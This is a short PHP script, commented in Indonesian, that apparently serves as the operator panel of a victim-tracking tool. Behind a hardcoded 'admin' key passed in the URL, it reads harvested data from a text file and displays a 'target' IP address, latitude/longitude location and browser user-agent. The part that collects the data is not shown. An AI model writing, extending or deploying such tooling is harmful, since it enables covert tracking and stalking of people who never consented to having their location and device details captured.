<?php
$wait = 0;
if (isset($_GET["k"]))
{
    $k = $_GET["k"];
    if ($k == "admin")
    {
        $wait = 1;
    }
    else
    {
        exit();
    }
}
else
{
    exit();
}

$f = "json_info.txt";
$a = fopen($f,"r");
$b = fread($a, filesize($f));
fclose($a);
$js = json_decode($b,true);
$ip = $js["ip"];
$loc = $js["lat"]." ".$js['lon'];
$ua = $js["ua"];
if ($loc == "null null")
{
    $loc = "Tidak diketahui";
}
echo "<br>ip target : ".$ip."</br>";
echo "<br>lokasi : ".$loc."</br>";
echo "<br>user-agent : ".$ua."</br>";
?>
